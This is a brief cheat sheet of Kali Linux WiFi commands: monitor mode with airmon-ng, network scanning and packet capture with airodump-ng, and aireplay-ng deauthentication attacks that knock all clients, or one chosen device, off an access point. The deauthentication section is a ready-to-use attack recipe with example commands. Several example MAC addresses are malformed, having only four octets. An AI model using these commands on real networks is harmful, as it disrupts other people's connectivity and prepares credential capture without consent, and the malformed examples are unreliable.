## Kali Linux WiFi Information Commands
1. `ifconfig`
2. `iwconfig`
3. `airmon-ng start wlan0` (replace `wlan0` with your device name)
4. `airodump-ng wlan0` - Shows all networks around
5. `airodump-ng --channel 8 --bssid [MAC address] wlan0mon` - Shows devices connected to the selected WiFi network

## AIRODUMP-NG

- `airodump-ng --channel <channel> -bssid <BSSID> --write <file_name> <interface>`
  
  Example: `airodump-ng --channel 12 --bssid 40:30:20:10 --write test mon0`

## Deauthentication Attack

- `aireplay-ng --deauth <#packets> -a <AP> <interface>`

  Example: `aireplay-ng --deauth 1000 -a 10:20:30:40 mon0`

## Target Attack

- `aireplay-ng --deauth <#packets> -a <AP> -c <target> <interface>`

  Example: `aireplay-ng --deauth 1000 -a 10:20:30:40 -c 00:AA:11:BB mon0`
